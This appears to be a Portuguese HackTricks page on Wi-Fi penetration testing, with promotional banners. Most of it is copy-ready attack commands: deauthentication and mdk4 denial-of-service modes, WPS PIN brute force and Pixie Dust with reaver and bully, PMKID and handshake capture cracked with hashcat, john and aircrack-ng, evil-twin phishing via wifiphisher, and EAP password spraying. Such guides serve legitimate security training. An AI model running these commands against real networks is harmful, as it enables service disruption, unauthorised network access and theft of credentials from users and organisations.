# Teste de Wifi

<details>

<summary><strong>Aprenda a hackear AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Junte-se ao servidor [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para se comunicar com hackers experientes e ca√ßadores de recompensas por bugs!

**Percep√ß√µes de Hacking**\
Envolver-se com conte√∫do que mergulha na emo√ß√£o e desafios do hacking

**Not√≠cias de Hacking em Tempo Real**\
Mantenha-se atualizado com o mundo do hacking em ritmo acelerado por meio de not√≠cias e insights em tempo real

**√öltimos An√∫ncios**\
Fique informado sobre os mais recentes programas de recompensas por bugs lan√ßados e atualiza√ß√µes cruciais na plataforma

**Junte-se a n√≥s no** [**Discord**](https://discord.com/invite/N3FrSbmwdy) e comece a colaborar com os melhores hackers hoje!

## Comandos b√°sicos de Wifi
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## Ferramentas

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon

Airgeddon is a versatile tool that can be used for various wireless security assessments.
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Executar o airgeddon com docker**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
### wifiphisher

Ele pode realizar ataques de Evil Twin, KARMA e Beacons Conhecidos e, em seguida, usar um modelo de phishing para conseguir obter a senha real da rede ou capturar credenciais de redes sociais.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Esta ferramenta automatiza ataques **WPS/WEP/WPA-PSK**. Ir√° automaticamente:

* Configurar a interface em modo monitor
* Escanear poss√≠veis redes - E permitir que voc√™ selecione a(s) v√≠tima(s)
* Se for WEP - Lan√ßar ataques WEP
* Se for WPA-PSK
* Se for WPS: Ataque Pixie dust e ataque de for√ßa bruta (tenha cuidado, o ataque de for√ßa bruta pode levar muito tempo). Note que n√£o tenta PIN nulo ou PINs gerados por banco de dados.
* Tentar capturar o PMKID do AP para quebr√°-lo
* Tentar desautenticar clientes do AP para capturar um handshake
* Se PMKID ou Handshake, tentar for√ßa bruta usando as top5000 senhas.

## Resumo dos Ataques

* **DoS**
* Pacotes de desautentica√ß√£o/desassocia√ß√£o -- Desconectar todos (ou um ESSID/Cliente espec√≠fico)
* APs falsos aleat√≥rios -- Esconder redes, poss√≠veis scanners de falha
* Sobrecarregar AP -- Tentar derrubar o AP (geralmente n√£o muito √∫til)
* WIDS -- Brincar com o IDS
* TKIP, EAPOL -- Alguns ataques espec√≠ficos para DoS em alguns APs
* **Quebra**
* Quebrar **WEP** (v√°rias ferramentas e m√©todos)
* **WPA-PSK**
* **PIN WPS** "For√ßa Bruta"
* **WPA PMKID** for√ßa bruta
* \[DoS +] Captura de **handshake WPA** + Quebra
* **WPA-MGT**
* Captura de **Nome de Usu√°rio**
* **For√ßa Bruta** de Credenciais
* **G√™meo Malvado** (com ou sem DoS)
* **G√™meo Malvado** Aberto \[+ DoS] -- √ötil para capturar credenciais de portal cativo e/ou realizar ataques LAN
* **G√™meo Malvado** WPA-PSK -- √ötil para ataques de rede se voc√™ souber a senha
* **WPA-MGT** -- √ötil para capturar credenciais da empresa
* **KARMA, MANA**, **MANA Alto**, **Beacon Conhecido**
* **+ Aberto** -- √ötil para capturar credenciais de portal cativo e/ou realizar ataques LAN
* **+ WPA** -- √ötil para capturar handshakes WPA

## DOS

### Pacotes de Desautentica√ß√£o

**Descri√ß√£o de** [**aqui**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

Ataques de **desautentica√ß√£o**, um m√©todo prevalente em hacking Wi-Fi, envolvem forjar frames de "gerenciamento" para **desconectar dispositivos de uma rede √† for√ßa**. Esses pacotes n√£o criptografados enganam os clientes fazendo-os acreditar que s√£o da rede leg√≠tima, permitindo que os atacantes coletem handshakes WPA para fins de quebra ou para interromper persistentemente as conex√µes de rede. Esta t√°tica, alarmante em sua simplicidade, √© amplamente utilizada e tem implica√ß√µes significativas para a seguran√ßa de rede.

**Desautentica√ß√£o usando Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
* \-0 significa desautentica√ß√£o
* 1 √© o n√∫mero de desautentica√ß√µes a enviar (pode enviar v√°rias se desejar); 0 significa envi√°-las continuamente
* \-a 00:14:6C:7E:40:80 √© o endere√ßo MAC do ponto de acesso
* \-c 00:0F:B5:34:30:30 √© o endere√ßo MAC do cliente a desautenticar; se isso for omitido, ent√£o √© enviada uma desautentica√ß√£o de transmiss√£o (nem sempre funciona)
* ath0 √© o nome da interface

### Pacotes de Desassocia√ß√£o

**Pacotes de desassocia√ß√£o**, semelhantes aos pacotes de desautentica√ß√£o, s√£o um tipo de quadro de gest√£o usado em redes Wi-Fi. Esses pacotes servem para interromper a conex√£o entre um dispositivo (como um laptop ou smartphone) e um ponto de acesso (AP). A distin√ß√£o principal entre desassocia√ß√£o e desautentica√ß√£o reside nos cen√°rios de uso. Enquanto um AP emite **pacotes de desautentica√ß√£o para remover explicitamente dispositivos n√£o autorizados da rede, os pacotes de desassocia√ß√£o s√£o tipicamente enviados quando o AP est√° passando por um desligamento, reinicializa√ß√£o ou realoca√ß√£o, exigindo assim a desconex√£o de todos os n√≥s conectados**.

**Este ataque pode ser realizado pelo mdk4 (modo "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Mais ataques de DOS por mdk4**

**Acesse** [**aqui**](https://en.kali.tools/?p=864)**.**

**MODO DE ATAQUE b: Inunda√ß√£o de Beacons**

Envia quadros de beacons para mostrar APs falsos aos clientes. Isso √†s vezes pode travar scanners de rede e at√© drivers!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**MODO DE ATAQUE a: Nega√ß√£o de Servi√ßo de Autentica√ß√£o**

O envio de quadros de autentica√ß√£o para todos os Pontos de Acesso (APs) acess√≠veis dentro do alcance pode sobrecarregar esses APs, especialmente quando h√° numerosos clientes envolvidos. Esse tr√°fego intenso pode levar √† instabilidade do sistema, fazendo com que alguns APs travem ou at√© mesmo sejam reiniciados.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**MODO DE ATAQUE p: Sondagem e For√ßa Bruta de SSID**

A sondagem de Pontos de Acesso (APs) verifica se um SSID √© revelado corretamente e confirma o alcance do AP. Essa t√©cnica, combinada com a **for√ßa bruta de SSIDs ocultos** com ou sem uma lista de palavras, ajuda a identificar e acessar redes escondidas.

**MODO DE ATAQUE m: Explora√ß√£o de Contramedidas de Michael**

O envio de pacotes aleat√≥rios ou duplicados para diferentes filas de QoS pode acionar as Contramedidas de Michael em **APs TKIP**, levando a um desligamento do AP por um minuto. Este m√©todo √© uma t√°tica eficiente de ataque de **DoS** (Nega√ß√£o de Servi√ßo).
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**MODO DE ATAQUE e: Inje√ß√£o de Pacotes EAPOL Start e Logoff**

Inundar um AP com **quadros EAPOL Start** cria **sess√µes falsas**, sobrecarregando o AP e bloqueando clientes leg√≠timos. Alternativamente, injetar **mensagens falsas de EAPOL Logoff** desconecta clientes √† for√ßa, ambos os m√©todos interrompem efetivamente o servi√ßo de rede.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**MODO DE ATAQUE s: Ataques para redes mesh IEEE 802.11s**

V√°rios ataques √† gest√£o de liga√ß√£o e encaminhamento em redes mesh.

**MODO DE ATAQUE w: Confus√£o WIDS**

A interliga√ß√£o de clientes a v√°rios n√≥s WDS ou a falsos APs rogue pode manipular os Sistemas de Detec√ß√£o e Preven√ß√£o de Intrus√µes, criando confus√£o e potencial abuso do sistema.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**MODO DE ATAQUE f: Packet Fuzzer**

Um fuzzer de pacotes com diversas fontes de pacotes e um conjunto abrangente de modificadores para manipula√ß√£o de pacotes.

### **Airggedon**

_**Airgeddon**_ oferece a maioria dos ataques propostos nos coment√°rios anteriores:

![](<../../.gitbook/assets/image (95).png>)

## WPS

O WPS (Wi-Fi Protected Setup) simplifica o processo de conex√£o de dispositivos a um roteador, aprimorando a velocidade e facilidade de configura√ß√£o para redes criptografadas com **WPA** ou **WPA2** Personal. √â ineficaz para a seguran√ßa facilmente comprometida do WEP. O WPS emprega um PIN de 8 d√≠gitos, validado em duas metades, tornando-o suscet√≠vel a ataques de for√ßa bruta devido ao seu n√∫mero limitado de combina√ß√µes (11.000 possibilidades).

### For√ßa Bruta no WPS

Existem 2 ferramentas principais para realizar essa a√ß√£o: Reaver e Bully.

* **Reaver** foi projetado para ser um ataque robusto e pr√°tico contra o WPS, e foi testado em uma ampla variedade de pontos de acesso e implementa√ß√µes do WPS.
* **Bully** √© uma **nova implementa√ß√£o** do ataque de for√ßa bruta no WPS, escrita em C. Possui v√°rias vantagens sobre o c√≥digo original do reaver: menos depend√™ncias, melhor desempenho de mem√≥ria e CPU, manipula√ß√£o correta da endianness e um conjunto mais robusto de op√ß√µes.

O ataque explora a **vulnerabilidade do PIN do WPS**, particularmente sua exposi√ß√£o dos quatro primeiros d√≠gitos e o papel do √∫ltimo d√≠gito como um checksum, facilitando o ataque de for√ßa bruta. No entanto, defesas contra ataques de for√ßa bruta, como **bloquear endere√ßos MAC** de atacantes agressivos, exigem **rota√ß√£o de endere√ßos MAC** para continuar o ataque.

Ao obter o PIN do WPS com ferramentas como Bully ou Reaver, o atacante pode deduzir o PSK WPA/WPA2, garantindo **acesso persistente √† rede**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**For√ßa Bruta Inteligente**

Esta abordagem refinada visa os PINs WPS usando vulnerabilidades conhecidas:

1. **PINs Pr√©-descobertos**: Utilize um banco de dados de PINs conhecidos vinculados a fabricantes espec√≠ficos conhecidos por usar PINs WPS uniformes. Este banco de dados correlaciona os tr√™s primeiros octetos dos endere√ßos MAC com PINs prov√°veis para esses fabricantes.
2. **Algoritmos de Gera√ß√£o de PIN**: Aproveite algoritmos como ComputePIN e EasyBox, que calculam PINs WPS com base no endere√ßo MAC do AP. O algoritmo Arcadyan requer adicionalmente um ID de dispositivo, adicionando uma camada ao processo de gera√ß√£o de PIN.

### Ataque WPS Pixie Dust

**Dominique Bongard** descobriu uma falha em alguns Pontos de Acesso (APs) relacionada √† cria√ß√£o de c√≥digos secretos, conhecidos como **nonces** (**E-S1** e **E-S2**). Se esses nonces puderem ser descobertos, quebrar o PIN WPS do AP se torna f√°cil. O AP revela o PIN dentro de um c√≥digo especial (hash) para provar que √© leg√≠timo e n√£o um AP falso (rogue). Esses nonces s√£o essencialmente as "chaves" para desbloquear o "cofre" que cont√©m o PIN WPS. Mais informa√ß√µes sobre isso podem ser encontradas [aqui](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\)).

Em termos simples, o problema √© que alguns APs n√£o usavam chaves aleat√≥rias o suficiente para criptografar o PIN durante o processo de conex√£o. Isso torna o PIN vulner√°vel a ser adivinhado de fora da rede (ataque de for√ßa bruta offline).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
Se voc√™ n√£o quer mudar o dispositivo para o modo de monitoramento, ou se `reaver` e `bully` apresentarem algum problema, voc√™ pode tentar o [OneShot-C](https://github.com/nikita-yfh/OneShot-C). Essa ferramenta pode realizar o ataque Pixie Dust sem a necessidade de mudar para o modo de monitoramento.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Ataque de PIN Nulo

Alguns sistemas mal projetados at√© permitem que um **PIN Nulo** (um PIN vazio ou inexistente) conceda acesso, o que √© bastante incomum. A ferramenta **Reaver** √© capaz de testar essa vulnerabilidade, ao contr√°rio do **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Todos os ataques WPS propostos podem ser facilmente realizados usando o _**airgeddon.**_

![](<../../.gitbook/assets/image (219).png>)

* 5 e 6 permitem que voc√™ tente **seu PIN personalizado** (se voc√™ tiver algum)
* 7 e 8 realizam o ataque **Pixie Dust**
* 13 permite testar o **PIN NULL**
* 11 e 12 ir√£o **recolher os PINs relacionados ao AP selecionado a partir de bancos de dados dispon√≠veis** e **gerar** poss√≠veis **PINs** usando: ComputePIN, EasyBox e opcionalmente Arcadyan (recomendado, por que n√£o?)
* 9 e 10 testar√£o **cada PIN poss√≠vel**

## **WEP**

T√£o quebrado e n√£o utilizado nos dias de hoje. Apenas saiba que o _**airgeddon**_ tem uma op√ß√£o WEP chamada "All-in-One" para atacar esse tipo de prote√ß√£o. Mais ferramentas oferecem op√ß√µes semelhantes.

![](<../../.gitbook/assets/image (432).png>)

***

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Junte-se ao servidor [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para se comunicar com hackers experientes e ca√ßadores de bugs!

**Percep√ß√µes de Hacking**\
Engaje-se com conte√∫do que mergulha na emo√ß√£o e desafios do hacking

**Not√≠cias de Hacking em Tempo Real**\
Mantenha-se atualizado com o mundo acelerado do hacking atrav√©s de not√≠cias e insights em tempo real

**√öltimos An√∫ncios**\
Fique informado sobre os mais novos programas de recompensas por bugs lan√ßados e atualiza√ß√µes cruciais na plataforma

**Junte-se a n√≥s no** [**Discord**](https://discord.com/invite/N3FrSbmwdy) e comece a colaborar com os melhores hackers hoje!

***

## WPA/WPA2 PSK

### PMKID

Em 2018, o **hashcat** [revelou](https://hashcat.net/forum/thread-7717.html) um novo m√©todo de ataque, √∫nico porque s√≥ precisa de **um √∫nico pacote** e n√£o requer que nenhum cliente esteja conectado ao AP de destino - apenas intera√ß√£o entre o atacante e o AP.

Muitos roteadores modernos adicionam um **campo opcional** ao **primeiro quadro EAPOL** durante a associa√ß√£o, conhecido como `Rede de Seguran√ßa Robusta`. Isso inclui o `PMKID`.

Como o post original explica, o **PMKID** √© criado usando dados conhecidos:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Dado que o "Nome PMK" √© constante, conhecemos o BSSID do AP e da esta√ß√£o, e o `PMK` √© id√™ntico ao de um aperto de m√£o completo de 4 vias, o **hashcat** pode usar essas informa√ß√µes para quebrar o PSK e recuperar a frase secreta!

Para **coletar** essas informa√ß√µes e **fazer for√ßa bruta** localmente na senha, voc√™ pode fazer:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
Os **PMKIDs capturados** ser√£o mostrados no **console** e tamb√©m **salvos** dentro de \_ **/tmp/attack.pcap**\_\
Agora, converta a captura para o formato do **hashcat/john** e quebre-o:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Por favor, note que o formato correto de um hash cont√©m **4 partes**, como: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838`. Se o seu cont√©m **apenas** **3 partes**, ent√£o, ele √© **inv√°lido** (a captura PMKID n√£o foi v√°lida).

Observe que o `hcxdumptool` **tamb√©m captura handshakes** (algo assim aparecer√°: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Voc√™ pode **transformar** os **handshakes** para o formato do **hashcat**/**john** usando `cap2hccapx`.
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_Notei que alguns handshakes capturados com esta ferramenta n√£o puderam ser quebrados mesmo sabendo a senha correta. Recomendaria capturar handshakes tamb√©m de forma tradicional, se poss√≠vel, ou capturar v√°rios deles usando esta ferramenta._

### Captura de Handshake

Um ataque em redes **WPA/WPA2** pode ser executado capturando um **handshake** e tentando **quebrar** a senha **offline**. Esse processo envolve monitorar a comunica√ß√£o de uma rede espec√≠fica e **BSSID** em um **canal** particular. Aqui est√° um guia simplificado:

1. Identifique o **BSSID**, **canal** e um **cliente conectado** da rede alvo.
2. Use `airodump-ng` para monitorar o tr√°fego de rede no canal e BSSID especificados, na esperan√ßa de capturar um handshake. O comando ser√° semelhante a este:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Para aumentar a chance de capturar um handshake, desconecte momentaneamente o cliente da rede para for√ßar uma nova autentica√ß√£o. Isso pode ser feito usando o comando `aireplay-ng`, que envia pacotes de desautentica√ß√£o para o cliente:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Note que, uma vez que o cliente foi desautenticado, ele pode tentar se conectar a um AP diferente ou, em outros casos, a uma rede diferente._

Uma vez que o `airodump-ng` exibe algumas informa√ß√µes de handshake, isso significa que o handshake foi capturado e voc√™ pode parar de ouvir:

![](<../../.gitbook/assets/image (172) (1).png>)

Uma vez que o handshake √© capturado, voc√™ pode **quebr√°-lo** com o `aircrack-ng`:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Verificar se o handshake est√° no arquivo

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Se esta ferramenta encontrar um handshake incompleto de um ESSID antes do completo, ela n√£o detectar√° o v√°lido._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Enterprise (MGT)**

Em **configura√ß√µes de WiFi empresarial, voc√™ encontrar√° v√°rios m√©todos de autentica√ß√£o**, cada um fornecendo diferentes n√≠veis de seguran√ßa e recursos de gerenciamento. Ao usar ferramentas como `airodump-ng` para inspecionar o tr√°fego de rede, voc√™ pode notar identificadores para esses tipos de autentica√ß√£o. Alguns m√©todos comuns incluem:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
* Este m√©todo suporta tokens de hardware e senhas √∫nicas dentro do EAP-PEAP. Ao contr√°rio do MSCHAPv2, n√£o utiliza um desafio de pares e envia senhas em texto simples para o ponto de acesso, representando um risco para ataques de degrada√ß√£o.
2. **EAP-MD5 (Message Digest 5)**:
* Envolve o envio do hash MD5 da senha do cliente. **N√£o √© recomendado** devido √† vulnerabilidade a ataques de dicion√°rio, falta de autentica√ß√£o do servidor e incapacidade de gerar chaves WEP espec√≠ficas da sess√£o.
3. **EAP-TLS (Transport Layer Security)**:
* Utiliza certificados do lado do cliente e do lado do servidor para autentica√ß√£o e pode gerar dinamicamente chaves WEP baseadas em usu√°rio e sess√£o para seguran√ßa das comunica√ß√µes.
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
* Fornece autentica√ß√£o m√∫tua por meio de um t√∫nel criptografado, juntamente com um m√©todo para derivar chaves WEP din√¢micas, por usu√°rio e por sess√£o. Requer apenas certificados do lado do servidor, com os clientes usando credenciais.
5. **PEAP (Protected Extensible Authentication Protocol)**:
* Funciona de forma semelhante ao EAP, criando um t√∫nel TLS para comunica√ß√£o protegida. Permite o uso de protocolos de autentica√ß√£o mais fracos sobre o EAP devido √† prote√ß√£o oferecida pelo t√∫nel.
* **PEAP-MSCHAPv2**: Frequentemente referido como PEAP, combina o mecanismo de desafio/resposta vulner√°vel MSCHAPv2 com um t√∫nel TLS protetor.
* **PEAP-EAP-TLS (ou PEAP-TLS)**: Semelhante ao EAP-TLS, mas inicia um t√∫nel TLS antes da troca de certificados, oferecendo uma camada adicional de seguran√ßa.

Voc√™ pode encontrar mais informa√ß√µes sobre esses m√©todos de autentica√ß√£o [aqui](https://en.wikipedia.org/wiki/Extensible\_Authentication\_Protocol) e [aqui](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Captura de Nome de Usu√°rio

Lendo [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) parece que se voc√™ estiver usando **EAP**, as **mensagens "Identidade"** devem ser **suportadas**, e o **nome de usu√°rio** ser√° enviado em **texto claro** nas **mensagens "Resposta de Identidade"**.

Mesmo usando um dos m√©todos de autentica√ß√£o mais seguros: **PEAP-EAP-TLS**, √© poss√≠vel **capturar o nome de usu√°rio enviado no protocolo EAP**. Para fazer isso, **capture uma comunica√ß√£o de autentica√ß√£o** (inicie o `airodump-ng` em um canal e o `wireshark` na mesma interface) e filtre os pacotes por `eapol`.\
Dentro do pacote "**Resposta de Identidade**", o **nome de usu√°rio** do cliente aparecer√°.

![](<../../.gitbook/assets/image (850).png>)

### Identidades An√¥nimas

Ocultar a identidade √© suportado tanto pelo EAP-PEAP quanto pelo EAP-TTLS. No contexto de uma rede WiFi, uma solicita√ß√£o de EAP-Identidade √© tipicamente iniciada pelo ponto de acesso (AP) durante o processo de associa√ß√£o. Para garantir a prote√ß√£o do anonimato do usu√°rio, a resposta do cliente EAP no dispositivo do usu√°rio cont√©m apenas as informa√ß√µes essenciais necess√°rias para o servidor RADIUS inicial processar a solicita√ß√£o. Esse conceito √© ilustrado pelos seguintes cen√°rios:

* EAP-Identidade = an√¥nimo
* Neste cen√°rio, todos os usu√°rios empregam o pseud√¥nimo "an√¥nimo" como identificador de usu√°rio. O servidor RADIUS inicial funciona como um servidor EAP-PEAP ou EAP-TTLS, respons√°vel por gerenciar o lado do servidor do protocolo PEAP ou TTLS. O m√©todo de autentica√ß√£o interno (protegido) √© ent√£o tratado localmente ou delegado a um servidor RADIUS remoto (dom√©stico).
* EAP-Identidade = an√¥nimo@realm\_x
* Nesta situa√ß√£o, usu√°rios de diferentes dom√≠nios ocultam suas identidades enquanto indicam seus respectivos dom√≠nios. Isso permite que o servidor RADIUS inicial encaminhe as solicita√ß√µes EAP-PEAP ou EAP-TTLS para servidores RADIUS em seus dom√≠nios dom√©sticos, que atuam como servidor PEAP ou TTLS. O servidor RADIUS inicial opera exclusivamente como um n√≥ de retransmiss√£o RADIUS.
* Alternativamente, o servidor RADIUS inicial pode funcionar como o servidor EAP-PEAP ou EAP-TTLS e lidar com o m√©todo de autentica√ß√£o protegido ou encaminh√°-lo para outro servidor. Essa op√ß√£o facilita a configura√ß√£o de pol√≠ticas distintas para v√°rios dom√≠nios.

No EAP-PEAP, uma vez que o t√∫nel TLS √© estabelecido entre o servidor PEAP e o cliente PEAP, o servidor PEAP inicia uma solicita√ß√£o de EAP-Identidade e a transmite atrav√©s do t√∫nel TLS. O cliente responde a esta segunda solicita√ß√£o de EAP-Identidade enviando uma resposta de EAP-Identidade contendo a verdadeira identidade do usu√°rio atrav√©s do t√∫nel criptografado. Esta abordagem impede efetivamente a revela√ß√£o da identidade real do usu√°rio para qualquer pessoa que esteja interceptando o tr√°fego 802.11.

O EAP-TTLS segue um procedimento ligeiramente diferente. Com o EAP-TTLS, o cliente normalmente se autentica usando PAP ou CHAP, protegido pelo t√∫nel TLS. Neste caso, o cliente inclui um atributo Nome de Usu√°rio e um atributo Senha ou CHAP-Senha na mensagem TLS inicial enviada ap√≥s o estabelecimento do t√∫nel.

Independentemente do protocolo escolhido, o servidor PEAP/TTLS obt√©m conhecimento da verdadeira identidade do usu√°rio ap√≥s o estabelecimento do t√∫nel TLS. A verdadeira identidade pode ser representada como usu√°rio@dom√≠nio ou simplesmente usu√°rio. Se o servidor PEAP/TTLS tamb√©m for respons√°vel por autenticar o usu√°rio, ele agora possui a identidade do usu√°rio e prossegue com o m√©todo de autentica√ß√£o protegido pelo t√∫nel TLS. Alternativamente, o servidor PEAP/TTLS pode encaminhar uma nova solicita√ß√£o RADIUS para o servidor RADIUS dom√©stico do usu√°rio. Esta nova solicita√ß√£o RADIUS omite a camada de protocolo PEAP ou TTLS. Nos casos em que o m√©todo de autentica√ß√£o protegido √© EAP, as mensagens EAP internas s√£o transmitidas para o servidor RADIUS dom√©stico sem a camada EAP-PEAP ou EAP-TTLS. O atributo Nome de Usu√°rio da mensagem RADIUS de sa√≠da cont√©m a verdadeira identidade do usu√°rio, substituindo o Nome de Usu√°rio an√¥nimo da solicita√ß√£o RADIUS de entrada. Quando o m√©todo de autentica√ß√£o protegido √© PAP ou CHAP (suportado apenas pelo TTLS), o Nome de Usu√°rio e outros atributos de autentica√ß√£o extra√≠dos da carga √∫til TLS s√£o substitu√≠dos na mensagem RADIUS de sa√≠da, substituindo o Nome de Usu√°rio an√¥nimo e os atributos EAP-Message TTLS encontrados na solicita√ß√£o RADIUS de entrada.

Para mais informa√ß√µes, consulte [https://www.interlinknetworks.com/app\_notes/eap-peap.htm](https://www.interlinknetworks.com/app\_notes/eap-peap.htm)

### EAP-Bruteforce (password spray)

Se o cliente deve usar um **nome de usu√°rio e senha** (observe que o **EAP-TLS n√£o ser√° v√°lido** neste caso), ent√£o voc√™ poderia tentar obter uma **lista** de **nomes de usu√°rios** (veja a pr√≥xima parte) e **senhas** e tentar **bruteforce** o acesso usando [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Voc√™ tamb√©m pode realizar esse ataque usando `eaphammer`:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Teoria dos ataques ao cliente

### Sele√ß√£o de rede e roaming

* O protocolo 802.11 define como uma esta√ß√£o se junta a um Conjunto de Servi√ßos Estendidos (ESS), mas n√£o especifica os crit√©rios para selecionar um ESS ou um ponto de acesso (AP) dentro dele.
* As esta√ß√µes podem se mover entre APs que compartilham o mesmo ESSID, mantendo a conectividade em um pr√©dio ou √°rea.
